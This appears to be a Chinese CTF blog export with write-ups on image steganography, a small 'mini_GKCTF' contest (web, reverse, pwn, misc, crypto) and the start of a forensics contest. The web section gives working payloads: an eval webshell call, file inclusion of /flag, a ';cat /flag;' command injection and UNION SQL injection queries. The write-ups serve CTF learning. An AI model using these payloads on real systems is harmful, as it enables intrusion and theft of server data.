提交。\n\nforemost得到两张相似的图片。\nBeyondCompare对比无果，回来查看原文件的十六进制。\n连接处得到一段base\nMZWGCZ33GZTDCNZZG5SDIMBYGBRDEOLCGY2GIYJVHA4TONZYGA2DMM3FGMYH2\n转换后得到\nflag&#123;6f1797d4080b29b64da5897780463e30&#125;\n15\n\n\n得到的 flag 请包上 flag{} 提交。来源：https://github.com/hebtuerror404/CTF_competition_warehouse_2018\n\n一张JPG\n右键文件属性无果，查看二进制，文件末尾存在504B0102字样，全文搜索504B0304，得到完整压缩包。\n得到1.txt\nﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;(\n类似上文\nAAencode编码(http://ctf.ssleye.com/aaencode.html)\n得\nfunction a()&#123;var a&#x3D;&quot;SUCTF&#123;happy double eleven&#125;&quot;;alert(&quot;双十一快乐&quot;);&#125;a();\n16\n\n\n得到的 flag 请包上 flag{} 提交。\n感谢 Iven Huang 师傅供题。\n比赛平台：https://ctfgame.w-ais.cn/\n\n得到两张图片，对第一张图查看二进制，提取出一加密压缩包。ZIP爆破得密码888866\nbeisi.txt\nWVRKc2MySkhWbmxqV0Zac1dsYzBQUT09\n64-&gt;64-&gt;64\n得\nkillerqueen\n至此咱们拥有了一个密钥及第二张图片\n需要密钥的图片隐写，steghide无果，尝试outguess\noutguess -r jljy.jpg -k killerqueen -t out.txt\n得到wctf2020{pretty_girl_alison_likes_jojo}\n17\n\n\n感谢菠萝吹雪师傅出题。\nflag 请替换 SUCTF{} 为 flag{} 后提交。\n\n图片貌似没啥东西，src里存在index.html,查看源代码发现\n&lt;?php echo &quot;here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2&#x3D;&#x3D;&#x3D;&quot; ?&gt;\nbase32:\nsuctf&#123;hAHaha_Fak3_F1ag&#125;\n返回观察图片，尝试lsb隐写后可得到\nU2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To&#x2F;KeuHg8vKAxFrVQ&#x3D;&#x3D;\n此处划重点U2FsdGVkX1开头的为DES加密！\n\n脑洞：密文为上述字符串，密钥为suctf{hAHaha_Fak3_F1ag}，通过http://www.metools.info/code/c27.html解密得到\n\nsuctf&#123;U_F0und_1t&#125;\n18\n\n\n得到的 flag 请包上 flag{} 提交。\n\n得到五张图片，以此查看二进制，明显的，\n5.png末尾得到\nI give U a gift:Yzcllfc0lN\n2.png中藏着很多.txt\n\n正如我们所知.7z也是压缩包的后缀名之一\n直接binwalk -e 2.png，未果\n统一替换377A为504B后分离，得1000个txt\n随意点开几个，发现内容一致\nN0thIng h3re\n根据大小或修改日期对这些文件进行排序，得到一个不一样的618.txt\nYou find it: 1RVcmVfc\n1.png\n猜测该图本应当跟其他几张类似\n先根据crc爆破长宽高\n# -*- coding: utf8 -*-import zlibimport struct#读文件file &#x3D; &#39;1.PNG&#39;  #注意，1.png图片要和脚本在同一个文件夹下哦~fr &#x3D; open(file,&#39;rb&#39;).read()data &#x3D; bytearray(fr[12:29])#crc32key &#x3D; eval(str(fr[29:33]).replace(&#39;\\\\x&#39;,&#39;&#39;).replace(&quot;b&#39;&quot;,&#39;0x&#39;).replace(&quot;&#39;&quot;,&#39;&#39;))crc32key &#x3D; 0x000C4ED3  #补上0x，copy hex value#data &#x3D; bytearray(b&#39;\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\xF4\\x00\\x00\\x01\\xF1\\x08\\x06\\x00\\x00\\x00&#39;)  #hex下copy grep hexn &#x3D; 4095 #理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了for w in range(n):#高和宽一起爆破    width &#x3D; bytearray(struct.pack(&#39;&gt;i&#39;, w))#q为8字节，i为4字节，h为2字节    for h in range(n):        height &#x3D; bytearray(struct.pack(&#39;&gt;i&#39;, h))        for x in range(4):            data[x+4] &#x3D; width[x]            data[x+8] &#x3D; height[x]            #print(data)        crc32result &#x3D; zlib.crc32(data)        if crc32result &#x3D;&#x3D; crc32key:            print(width,height)            #写文件            newpic &#x3D; bytearray(fr)            for x in range(4):                newpic[x+16] &#x3D; width[x]                newpic[x+20] &#x3D; height[x]            fw &#x3D; open(file+&#39;.png&#39;,&#39;wb&#39;)#保存副本            fw.write(newpic)            fw.close\n得到初步恢复的图片\n二进制打开后发现chunk[2]和chunk[3]不对劲\n（此处笔者本身版本不显示template，在https://www.sweetscape.com/010editor/repository/files/PNG.bt复制后创建并运行了png.bt后得到，希望对你有帮助\n对比后发现是缺少了49444154IDAT头，补上即可\n然后就得到了正常显示的11.Png！！\n（学到了，怪不得对于有的格式我的010editor会显示得更详细\nStegsolve进行处理，在blue2发现二维码！\n\n得到\nZmxhZ3s0X3\n3.png着实有难度\n在crc值上做文章\n每块连起来是\n33526c5a33303d\n十六进制解码后\n3RlZ30&#x3D;\n4.png\nstrings 4.png\nanother part:cExlX1BsY&#x3D;\n依次得到\nZmxhZ3s0X31RVcmVfc3RlZ30&#x3D;cExlX1BsY&#x3D;Yzcllfc0lN\n没错顺序是猜的\nZmxhZ3s0X3Yzcllfc0lNcExlX1BsY1RVcmVfc3RlZ30&#x3D;flag&#123;4_v3rY_sIMpLe_PlcTUre_steg&#125;\n19\n\n\n看图吧。\n请将 bsides_delhi{} 换成 flag{} 提交。\n由 15h3na0 师傅提供。\n\n得到一张png图片，能正常打开，查看二进制\n文件末尾有东西，以BPG开头\n搜索引擎说这是也是个图片类型，同时找到了查看器https://bellard.org/bpg/\n下载后\nbpgdec bpg-0.9.8-win64\\Untitled1.bpg\n得到out.png\n\nYnNpZGVzX2RlbGhpe0JQR19pNV9iM3R0M3JfN2g0bl9KUEd9Cg&#x3D;&#x3D;\nbase一把梭\nbsides_delhi&#123;BPG_i5_b3tt3r_7h4n_JPG&#125;\n20\n\n\n得到的 flag 请包上 flag{} 提交。\n\n严格意义上来说不算图片类\n二进制文件尾发现压缩包\n分离出之后是开头为ELF的文件\nkali\nroot@kalinew:# .&#x2F;hidden_binary Ah, you found me!utflag&#123;2fbe9adc2ad89c71da48cabe90a121c0&#125;\n","tags":["MISC"]},{"title":"mini_GKCTF","url":"/2020/09/15/mini-GKCTF/","content":"写在前面\n\n浅薄笔者经过几个月的学习，misc和crypto的部分算是有所收获，web和re还不能算是入门，以此篇记录此前一次小比赛。并在10月19日，比赛正式开始后进行一次加更。\n\n签到\n\n\n\nweb\n\n\n才刚进校园就想做毕设了，你这也太深谋远虑了嗷，先看看憨憨学长的毕设算了：毕设首页\n\ncurl + u查看源码\n\n\n\n后来，憨憨学长恼羞成怒再次修改了自己的毕设首页：毕设首页\n\n同上题，查看源码后进入http://172.17.135.14:8002/images/highlight.flag.js，得到flag.\n\n\n\nPHP一定是世界上最好的语言！\n\n&lt;?phphighlight_file(__File__);$Ginkgo&#x3D;$_GET[&quot;Ginkgo&quot;];$Vigorous&#x3D;$_GET[&quot;Vigorous&quot;];if ($Ginkgo &#x3D;&#x3D; &quot;Mini_Ginkgo_Wonderful&quot;)    &#123;        print(&quot;好！冲冲冲~！&quot;);        if($Vigorous &#x3D;&#x3D; &quot;N1D1W4Dul&quot;)            &#123;                system(&quot;cat &#x2F;flag.txt&quot;);            &#125;            &#125;else    &#123;        print(&quot;别把别把别把&quot;);    &#125;?&gt;\nget传参得flag。\n\n\n\n在那个晚上，有一个男人，叫w4nder，他看带🔥们都打累了，给大家整点有趣的游戏，通关就得flag~ 题目链接\n\n玩游戏得flag\n\n\nGinkgo的易烊千玺说他最喜欢的就是flag和木马了，现在他都给你了：题目链接\n\n&lt;?phphighlight_file(__File__);&#x2F;&#x2F;你知道什么是一句话木马🐎？$W4nder&#x3D;$_POST[&quot;W4nder&quot;];$Webshell&#x3D;$_POST[&quot;Webshell&quot;];if ($W4nder &#x3D;&#x3D; &quot;THE_Jackson_Yi_0F_G1nkgo&quot;)    &#123;        print(&quot;啊这，这你都知道&quot;);        eval($Webshell);    &#125;else    &#123;        print(&quot;爬&quot;);    &#125;?&gt;\nPOST传参\nW4nder&#x3D;THE_Jackson_Yi_0F_G1nkgo&amp;Webshell&#x3D;system(&#39;cat &#x2F;flag&#39;);\n得flag.\n\n&lt;?phphighlight_file(__File__);&#x2F;&#x2F;我把flag放在根目录下啦，是linux系统嗷$file&#x3D;$_GET[&quot;file&quot;];$number&#x3D;$_GET[&quot;number&quot;];$number1&#x3D;rand(3,44);echo $number1;echo &quot;\\n&quot;;if($number &#x3D;&#x3D; $number1)    &#123;        echo &quot;我丢，你是赌怪🐎?&quot;;        include($file);            &#125;else    &#123;        echo &quot;玩游戏,我最喜欢梭哈了&quot;;    &#125;?&gt;\n考察了GET传参和文件包含，输入命令\n?number&#x3D;3&amp;file&#x3D;&#x2F;flag\nnumber为3到44之间的随机数，可以任意输入，接下来就是看运气了😂\n\n本题为CTFHUB中Web-Web前置技能-SQL注入中字符型注入的类似题。先回顾了一遍原题，比较后发现两题在注入过程中仅引号部分有区别.\n整理思路\n\n数据库名\n\n&#39;123&#39; union select database(),2 #&#39;\n得数据库名easy_sql\n\n表名\n\n&#39;123&#39; union select group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;easy_sql&#39; #&#39;\n得存在两个表flag,users\n\n字段名\n\n&#39;123&#39; union select group_concat(column_name) ,3 from information_schema.columns where table_name&#x3D;&#39;flag&#39; #&#39;\n得字段名flag\n\n获取flag\n\n&#39;123&#39; union select flag,3 from easy_sql.flag #&#39;\n[💧JSBUG💧]\n\n💧得得是一个爱老婆的男人，有一天他的爱人被😈抓走了， 💧得得为了拯救老婆，决定穿上铠甲，踏上拯救老婆的道路， 💧得得遇到了第一个怪物就是史莱姆，💧得得觉得🔪太慢了，想另辟蹊径 你能帮他想想办法吗？题目链接\n\n\n已知经验值应该达到10000，而每次只能打1-9只史莱姆，通过更改源码中maxlength=1为maxlength=100000等，回车后直接练级，挑战，得flag。\n\n页面提示备份文件，dirsearch扫描后发现存在www.zip，下载后得到网页源码\n&lt;?\t\t$key &#x3D; $_REQUEST[&quot;Ginkgo&quot;];\t\tif($key !&#x3D; &quot;&quot;) \t\t&#123;\t\t\t$ccc&#x3D;passthru(&quot;grep -i $key fl.txt&quot;);\t\t\tprint_r($ccc);\t\t&#125;\t\telse\t\t&#123;\t\t\t\techo &quot;多想想备份文件&quot;;\t\t&#125;?&gt;\n简单的PHP代码，不过在应该给Ginkgo(key)赋什么值却让我犯了难。查询了grep命令，尝试Ginkgo=flag,也只得到满屏的假flag。\n后学到了隔离（或许不叫这个名），得知应该输入的值为\nGinkgo&#x3D;;cat &#x2F;flag;\n完整命令就变成了\ngrep -i ; cat &#x2F;flag; f1.txt\n关键点就在于这几个“；”，使得整个命令只留下了我们想要的&quot;cat /flag;&quot;\n[😀👊的爱情故事]\n\n一段惊心动魄的爱情天🐕故事。题目链接\n\n机器人协议，搜索/robots.txt文件，得\nDisallow:&#x2F;i_love_robot.php\n跳转到/i_love_robot.php，得到一个新的后台管理页面，根据首页文字提示，已知密码为20190821，那账号是什么呢\n盲猜admin，对了🙂\nre\n[GKdoor]\npublic boolean checkPassword(String password) &#123;        return password.length() &#x3D;&#x3D; 32 &amp;&amp;        password.charAt(26)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;        password.charAt(20)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;        password.charAt(39)  &#x3D;&#x3D; &#39;2&#39; &amp;&amp;        password.charAt(3)  &#x3D;&#x3D; &#39;8&#39; &amp;&amp;        password.charAt(15)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;        password.charAt(8)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;        password.charAt(23)  &#x3D;&#x3D; &#39;f&#39; &amp;&amp;        password.charAt(4)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;        password.charAt(5)  &#x3D;&#x3D; &#39;5&#39; &amp;&amp;        password.charAt(30)  &#x3D;&#x3D; &#39;e&#39; &amp;&amp;        password.charAt(31)  &#x3D;&#x3D; &#39;2&#39; &amp;&amp;        password.charAt(32)  &#x3D;&#x3D; &#39;8&#39; &amp;&amp;        password.charAt(33)  &#x3D;&#x3D; &#39;a&#39; &amp;&amp;        password.charAt(34)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;        password.charAt(41)  &#x3D;&#x3D; &#39;a&#39; &amp;&amp;        password.charAt(10)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;        password.charAt(11)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;        password.charAt(12)  &#x3D;&#x3D; &#39;2&#39; &amp;&amp;        password.charAt(1)  &#x3D;&#x3D; &#39;3&#39; &amp;&amp;        password.charAt(19)  &#x3D;&#x3D; &#39;0&#39; &amp;&amp;        password.charAt(42)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;        password.charAt(43)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;        password.charAt(13)  &#x3D;&#x3D; &#39;0&#39; &amp;&amp;        password.charAt(14)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;        password.charAt(17)  &#x3D;&#x3D; &#39;3&#39; &amp;&amp;        password.charAt(18)  &#x3D;&#x3D; &#39;2&#39; &amp;&amp;        password.charAt(21)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;        password.charAt(22)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;        password.charAt(2)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;        password.charAt(27)  &#x3D;&#x3D; &#39;e&#39; &amp;&amp;        password.charAt(28)  &#x3D;&#x3D; &#39;2&#39; &amp;&amp;        password.charAt(7)  &#x3D;&#x3D; &#39;e&#39; &amp;&amp;        password.charAt(37)  &#x3D;&#x3D; &#39;f&#39; &amp;&amp;        password.charAt(16)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;        password.charAt(6)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;        password.charAt(24)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;        password.charAt(25)  &#x3D;&#x3D; &#39;7&#39; &amp;&amp;        password.charAt(0)  &#x3D;&#x3D; &#39;4&#39; &amp;&amp;        password.charAt(40)  &#x3D;&#x3D; &#39;8&#39; &amp;&amp;        password.charAt(29)  &#x3D;&#x3D; &#39;0&#39; &amp;&amp;        password.charAt(35)  &#x3D;&#x3D; &#39;9&#39; &amp;&amp;        password.charAt(36)  &#x3D;&#x3D; &#39;6&#39; &amp;&amp;        password.charAt(38)  &#x3D;&#x3D; &#39;e&#39; &amp;&amp;        password.charAt(9)  &#x3D;&#x3D; &#39;5&#39; &amp;&amp;;    &#125;\n根据下标转十六进制即可\n[CheckPlus]\n\n你能找到是什么加密🐎\n\n拖入IDA，找到可疑字符串\nZmxhZ3tOb3dZb3VMZWFybmVkUmV2ZXJzZX0&#x3D;\nbase64解密得flag.\n[2048]\n玩游戏得flag\n[assembly]\n0070210C: 66 6c 61 67 7b 61 73 6d 69 73 66 75 6e 7d\n十六进制转字符\nf l a g &#123; a s m i s f u n &#125;\npwn\n[easy_nc]\n\n(netcat是啥？网络猫？ 王队大姐姐：好！冲冲冲！nc 39.105.231.146 8013)\n\nnc直接得flag\n[hard_pwn]\n\n(所有题目统一的libc库嗷这道题目可能是最难的pwn题目嗷39.105.231.146:8002)\n\n没有回显，奇怪，随便输了点东西，有返回。输入cat flag。得。\n[🍑姐姐的PWN学习之路]\n\n🍑姐姐学习pwn已经五天了，她终于学到了数组越界。\n有一天，一个男的突然加了🍑姐姐，主动发消息要追求🍑姐姐，\n🍑姐姐鼓鼓嘴，怎么可能这么容易就追到了呢，\n先学会数组越界再说吧！\n（听说这是专门給luoluo姐设置的flag嗷）\n39.105.231.146:8003\n\n随便输入多个字符，发现\noooooooooooooooooooooooooooooooolsb&#x3D;&gt;ls\n但仍然没有反应，打开附件，观察\nputs(&quot;please pwn me!!!&quot;);  while ( 1 )  &#123;    read(0, &amp;buf, 0x100uLL);    if ( (_BYTE)v13 &#x3D;&#x3D; 99 &amp;&amp; BYTE1(v13) &#x3D;&#x3D; 100 &amp;&amp; v21 &#x3D;&#x3D; 97 &amp;&amp; HIBYTE(v8) &#x3D;&#x3D; 102 &amp;&amp; BYTE3(v6) &#x3D;&#x3D; 119 )      break;    printf(&quot;b&#x3D;&gt;%s\\n&quot;, &amp;v13, buf, v5, v6);    puts(&quot;you need &#39; b&#x3D;&gt;cd &#39; &quot;);  &#125;  printf(&quot;tql&quot;, &amp;buf, buf, v5, v6, v7, v8, v9, v10, v11, *(_QWORD *)&amp;v12);  system(&quot;&#x2F;bin&#x2F;sh&quot;);  return 0;\n(或根据题干，也可得知应传入cd（等）)，可得flag\nI need b&#x3D;&gt;cdoooooooooooooooooooooooooooooooocdef2                                                       tqlflag&#x2F;bin&#x2F;sh: 3: flag: not foundcat &#x2F;flagflag&#123;luoluo_is_so_beatiuful&#125;\nmisc\n有手就行\n\n[有手就行]\n水平翻转得flag\n\n真实的压缩包\n\n[真实的压缩包]\n\n\n虚假的压缩包\n[虚假的压缩包]\n\n\n\n有眼就行\n\n[有眼就行]\n\n\n追踪他的密码\n\n[追踪他的密码]\n\n\nhello hex\n\n[hello hex1]\n\n\n\nbaby流量分析\n\n[baby流量分析]\n\n\n郭哥的mimi\n\n[郭哥的mimi]\n\n半夜三点，郭哥得知赌神已到，忍不住赌瘾大发，和赌神在赌场中疯狂梭哈，结果把flag掉到赌场里，被🍊⭐哥抓个正着，现在🍊⭐哥把郭哥的流量监控发出来了，不知道你能找到flag吗\n\n\n丢尽wireshark里找了半天，终于找到一个POST传参的流量，打开得flag\nflag&#x3D;flag%7B02051125340512_Ginkgo%7D\nURL解码后得正确flag。\nPixelJihad\n\n[PixelJihad]\n\n你需要一双善于发现的眼睛，和一个善于发现的脑子，更需要一对善于发现的手，这是你与生俱来的优势，发现图片里隐藏的信息吧！\n\n\n搜索文字题目，得在线网站\n需要密码。既然是图片，拖进winhex里找找叭，文件尾有发现：Y3RmaXNmdW4=\nbase64解密后得ctfisfun。\n两者结合，得flag.\n阿巴阿巴\n\n[阿巴阿巴]\n\nemmm没啥好说的，动图分离就得到一张郭哥的表情包hhh\ncrypto\ncrypto1\n[注入哥的爱情回执]\n\n注入哥给喜欢的女孩表白了！\n女孩害羞地说\n“ -.–/…/.-…/.----/–…/…–.-/-.–/-----/…-/…–.-/.-/.-./…-/…–.-/.-/-./…–.-/–./-----/-----/-…/…–.-/–./.-/-.–”，\n注入哥不知道是什么意思，懊恼极了，你能帮助他吗？\n提交为flag{*}\n\n摩斯电码解密\n[莱×🌂兄弟]\n\nluoluo说：\n“S19aMHhzX28xem1tX3ZzYyE=”\n轩成哥还说：“coco”\n不会吧不会吧，不会有人不知道这是什么意思吧。\n\nbase64解密+以coco为密钥的维吉尼亚\n[中华文化]\n\n中文电码\n00225478242905530590112947373234\n\n中文电码解密\n[文化人]\n\n新佛曰：心即是是聞莊修如聞愍亦嚤是莊摩婆塞阿念般宣是怖訶須是薩慧怖阿是色諦聞若叻羅缽菩般若斯嘇咤怖寂修般吶修訶願嚴怖訶宣宣吽寂我彌怖色如諸如諸彌伏亦菩般斯婆菩伏諦斯兜羅阿般降蜜菩劫念隸所怖摩心如陀咒菩訶缽諸慧菩陀薩諦囉心薩般嘚怖塞喃陀亦尊怖愍咒隸心諸宣僧怖缽咤願咒亦諸斯喃嘇寂愍諸叻尊迦喃祗怖隸夷祗訶怖咒般吶蜜僧隸伏阿哆祗迦聞須斯聞嚩如嘚兜須即陀吽嚤如宣羅兜降降婆哆夷蜜怖耨嚴伏諸隸彌耨若兜我怖陀嘚婆哆慧所怖莊隸即諦修訶薩怖嚩兜菩迦宣諦哆怖如如囑囑\n\n新佛曰得：\n公正公正公正民主和谐文明和谐民主公正公正公正自由和谐法治公正自由文明友善法治和谐富强和谐法治和谐法治和谐文明文明诚信和谐和谐自由公正自由和谐民主和谐自由文明诚信和谐和谐爱国和谐公正公正民主和谐平等文明诚信和谐和谐自由公正平等公正平等公正自由和谐爱国公正文明公正民主和谐敬业和谐和谐和谐和谐公正和谐和谐敬业\n社会主义核心价值观解密得flag.\n[天干地支]\n天干地支加甲子(X+60)转ASCII得flag\n[Biometric list]\n\n我在一片插有石碑的海滩上醒来，背后是幽深的海，抬头是晨光和高山，我飞过蓝色的石台，蝴蝶围绕，冲天而起，石碑前的先祖告诉我，你需要一个Biometric list来获取漂亮的flag。\n\n该题与前不久遇到的一道题类似，生物特征列表（PGP），通过搜索附件中的关键词可得到提示，转16进制后得flag\n[魏✌呐和阿①爱丝]\n\n江水哥说你只要解出这个题，他就带你去浪漫Vienna\nM：U2FsdGVkX18S8k9WSjCOYu7omOyRJYSWvopJOt3m4aJ7n+RjtsfKg3bvWuD3wk/U\n\n阿①爱丝谐音AES,在线网站解密\n[啪嗒啪嗒啪嗒]\n\n我看见小矮人们手拉手拨弹竖琴，\n我看见大高个们在树洞下烤螃蟹，\n我还点亮了很多旅人，\n却只能看到他们飞离的尾羽，\n我不想再做孤狼，\n我想认识新朋友！\n于是低下头看着键盘，敲打着：\n“31 91 34 31 33 61 61 13 94 51 34 51 81 94 41 21 61 91 94 54 32 81 32 94 11 71 32 31 13 34 33 51 21 43 71 34”\n这是我可爱的小键盘~\n1 2 3 4 5 6 7 8 9\nq w e r t y u i o\na s d f g h j k l\nz x c v b n m p -\n（得到的明文带上flag{}包裹提交）\n\n对应即可\n[王可可大讲堂]\n\n王可可老师：\n“1977年，Ron Rivest、Adi Shamir、Leonard Adleman\n三个老哥提出了一种加密算法，你知道是什么吗？”\n\n已知eqpc,\ne &#x3D; 65537p &#x3D; 104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179q &#x3D; 140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501c &#x3D; 4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194\n脚本得：\nimport gmpy2from libnum import s2nc&#x3D;gmpy2.mpz(4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194)p &#x3D; gmpy2.mpz(104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179)q &#x3D; gmpy2.mpz(140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501)e&#x3D;gmpy2.mpz(65537)phi_n&#x3D;(p-1)*(q-1)d&#x3D;gmpy2.invert(e,phi_n)m&#x3D;pow(c,d,p*q)print &quot;plaintext:&quot;print hex(m)[2:].decode(&#39;hex&#39;)\n得flag.\n[我真的不知道他是哪方面的题目了]\n\n婷羽姐说这是密码学，俺做了一遍发现是MISC。 婷羽姐说CRYPTO和MISC不分家。百度和PS是基操哇。\n\n附件名为base，base64解码，base64还可以转图片。\n转出了残缺的二维码，搜索已知的二维码头，PS后可得flag。\n[同音之旅]\n\n我穿上漂亮的衣服继续在海滩上行走，路过的旅人告诉我，再往前走是云海，你需要飞上20层楼的高度，拿到从天空王国坠落的5个星光，前往钟声响荡的神殿，与4位先祖在星光长河里相逢，带上你收集的钥匙与先祖换取flag吧。\n13972421090544136056524896\n（得到的明文加上flag{}包裹提交）\n\n555,丹姐果然每次都刷新我的知识面http://www.atoolbox.net/Tool.php?Id=919，结合文字，在线解密。\n[去冒险吧！]\n\n嘿！在微风吹拂的云野，带着我的白蜡烛出发，围着大高个转圈，他就拉上手带着我飞过栅栏，冲下浮空岛也好，鲲鳐也跟着我们叫唤，冲上瀑布吧，水帘也拦不住想去冒险的心情，而他却突然停止滑翔，带着斗篷上蔚蓝的泛光，缓缓在一座石碑前落下，一个骑士跪道出凯撒大帝的威名。l3l818r544j}gg-glm24j0{1g-57-kik1i10l46-jh\n\n根据提示，栅栏+凯撒，关键点在于，凯撒加密不对标点符号进行处理，故在尝试栅栏时“{}”应分别在第五位和最后一位，再进行凯撒密码一把梭，得flag。\n[先祖的教诲]\n\n迷茫的我走在雨帘里，渐渐斗篷褪了色，渐渐步伐不在充满活力，渐渐没了飞翔的兴趣，我在一座亭子里停下，跪坐祈祷的先祖看到我，如是说道————新佛曰：修即聞羅羅莊修如塞愍隸囉兜若念色心菩色空婆即嘇降慧念空兜咤薩慧彌訶彌如迦嚤心寂叻菩諸莊須缽善阿吽嘚宣若陀善劫隸嚴陀善慧摩蜜塞念祗陀隸吽斯迦慧心耨訶諸哆叻色喃所咤善訶亦嚤吽即叻訶闍尊寂寂莊慧降迦降彌寂願降蜜耨善劫即吽祗訶囉心莊祗婆嘇兜僧愍諦慧劫羅寂訶是修嚴婆諸須莊婆薩若喃喃迦須降咒如尊喼慧宣心隸祗諸喃祗波諦咤喼囉咤色嘚夷喼劫陀善菩降彌嘚諸叻嘇阿波嘚嘚是修喃諦闍慧祗缽耨我慧若斯善僧缽即叻修祗宣嚩婆菩斯祗若兜兜菩嘚亦嘚嚤婆是寂須善陀即嚤摩薩所善心訶諦如闍斯缽喼訶哆蜜寂伏空我訶彌兜願尊叻願斯善嘚夷薩夷慧嚴亦闍闍阿願聞阿吽阿囉摩眾嚤心迦闍蜜塞伏喼哆吶婆婆塞菩宣咒聞念願劫咒咒斯咤菩兜須吶聞慧願阿諸咒咤念哆念咒亦嘇莊叻善諸聞諸菩寂吽宣菩莊彌訶斯彌諦阿善聞喃願色兜嚩色夷念嘚吽阿空摩所諸吽斯彌伏諸念摩塞陀寂羅祗念叻祗斯斯陀夷伏菩菩慧哆空喼如是念哆菩降阿哆我眾色劫聞亦若訶嚤嚴波叻劫塞咒即耨咤善伏莊哆般諦宣斯宣蜜咤須咤嚴隸是訶塞色塞聞所善迦叻嚩須迦吶兜兜慧迦是諦尊願嘚色劫阿心修嚴諸心嚴囉塞囉善訶陀色迦塞修諸咒須嚩諦嚤善囑\n\n新佛曰解密+佛曰解密，得flag。\n个人觉得这道题与前面考点部分重复，送分题。\n","tags":["challenge"]},{"title":"2017年第三届美亚杯电子取证-个人赛WP","url":"/2021/04/15/2017%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BE%8E%E4%BA%9A%E6%9D%AF%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81-%E4%B8%AA%E4%BA%BA%E8%B5%9BWP/","content":"2017年第三届美亚杯电子取证-个人赛\n\n案件背景\n\nGary是一位经常用手提电脑的人，而且热爱足球运动，常常看足球网站。他于2007年9月开始想赚快钱，思想变得偏激，并关注一些违法的事。于是Gary就想着赌博，查阅军事资料，了解恐怖袭击的新闻报道。另外他开始上网寻找有关如何购买枪械、刀等武器的资料，还寻找如何制造假网站，但最后均无收获。\n检材：\n.e01镜像\n工具软件：\n取证大师V6.1.67374RTM（FMP）\n\n1：求镜像的MD5哈希值\n\n\n\n1\nGary的笔记本电脑已成功取证并制作成镜像 (Forensic Image)，下列哪个是其MD5哈希值。\n\n\n\n\nA.\n0CFB3A0BB016165F1BDEB87EE9F710C9\n\n\nB.\n5F1BDEB87EE9F710C90CFB3A0BB01616\n\n\nC.\nA0BB016160CFB3A0BB0161661670CFB3\n\n\nD.\n16160CFB3A0BB016166A0BB016166167\n\n\nE.\nFB3A0BB016165 B016166 A0DF7FJE2EJ0\n\n\n\n证据文件-》选中镜像-》摘要-》查看md5值\n\n2：求硬盘分区\n\n\n\n2\n根据此镜像 (Forensic 